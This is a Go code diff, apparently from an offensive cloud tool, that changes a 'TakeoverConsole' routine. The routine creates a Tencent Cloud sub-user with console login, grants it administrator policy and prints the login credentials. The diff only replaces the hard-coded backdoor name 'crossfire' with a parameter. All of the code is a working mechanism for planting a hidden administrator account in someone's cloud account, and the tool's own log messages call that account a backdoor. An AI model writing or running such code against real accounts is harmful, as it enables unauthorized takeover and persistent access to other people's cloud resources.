@@ -11,39 +11,39 @@ import (
 	"github.com/tencentcloud/tencentcloud-sdk-go/tencentcloud/common"
 )
 
-func CreateUser(randomPasswords string) {
+func CreateUser(userName string, password string) {
 	request := cam.NewAddUserRequest()
-	request.Name = common.StringPtr("crossfire")
+	request.Name = common.StringPtr(userName)
 	request.ConsoleLogin = common.Uint64Ptr(1)
-	request.Password = common.StringPtr(randomPasswords)
+	request.Password = common.StringPtr(password)
 	request.NeedResetPassword = common.Uint64Ptr(0)
 	_, err := tencentcam.CAMClient().AddUser(request)
 	errutil.HandleErrNoExit(err)
 	if err == nil {
-		log.Debugln("创建 crossfire 用户成功 (Create crossfire user successfully)")
+		log.Debugf("创建 %s 用户成功 (Create %s user successfully)", userName, userName)
 	}
 }
 
-func GetUserUin() uint64 {
+func GetUserUin(userName string) uint64 {
 	request := cam.NewGetUserRequest()
-	request.Name = common.StringPtr("crossfire")
+	request.Name = common.StringPtr(userName)
 	response, err := tencentcam.CAMClient().GetUser(request)
 	errutil.HandleErrNoExit(err)
 	if err == nil {
-		log.Debugln("获取 crossfire 用户UIN (Get crossfire user Uin successfully)")
+		log.Debugf("获取 %s 用户 UIN (Get %s user Uin successfully)", userName, userName)
 	}
 	return *response.Response.Uin
 }
 
-func AttachPolicyToUser() {
-	UserUin := GetUserUin()
+func AttachPolicyToUser(userName string) {
+	UserUin := GetUserUin(userName)
 	request := cam.NewAttachUserPolicyRequest()
 	request.PolicyId = common.Uint64Ptr(1)
 	request.AttachUin = common.Uint64Ptr(UserUin)
 	_, err := tencentcam.CAMClient().AttachUserPolicy(request)
 	errutil.HandleErrNoExit(err)
 	if err == nil {
-		log.Debugln("成功为 crossfire 用户赋予管理员权限 (Successfully grant AdministratorAccess policy to the crossfire user)")
+		log.Debugf("成功为 %s 用户赋予管理员权限 (Successfully grant AdministratorAccess policy to the %s user)", userName, userName)
 	}
 }
 
@@ -55,12 +55,11 @@ func GetOwnerUin() string {
 	return *OwnerUin
 }
 
-func TakeoverConsole() {
+func TakeoverConsole(userName string) {
 	password := util.GenerateRandomPasswords()
-	CreateUser(password)
-	AttachPolicyToUser()
+	CreateUser(userName, password)
+	AttachPolicyToUser(userName)
 	OwnerID := GetOwnerUin()
-	userName := "crossfire"
 	loginURL := "https://cloud.tencent.com/login/subAccount"
 	data := [][]string{
 		{OwnerID, userName, password, loginURL},
@@ -69,5 +68,5 @@ func TakeoverConsole() {
 	var header = []string{"主账号 ID (Primary Account ID)", "子用户名 (Sub User Name)", "登录密码 (Password)", "控制台登录地址 (Login URL)"}
 	var td = cloud.TableData{Header: header, Body: data}
 	cloud.PrintTable(td, "")
-	log.Infoln("接管控制台成功，接管控制台会创建 crossfire 这个后门用户，如果想删除该后门用户，请执行 cf tencent console cancel 命令。(Successfully take over the console. Since taking over the console creates the backdoor user crossfire, if you want to delete the backdoor user, execute the command cf tencent console cancel.)")
+	log.Infof("接管控制台成功，接管控制台会创建 %s 这个后门用户，如果想删除该后门用户，请执行 cf tencent console cancel 命令。(Successfully take over the console. Since taking over the console creates the backdoor user crossfire, if you want to delete the backdoor user, execute the command cf tencent console cancel.)", userName)
 }
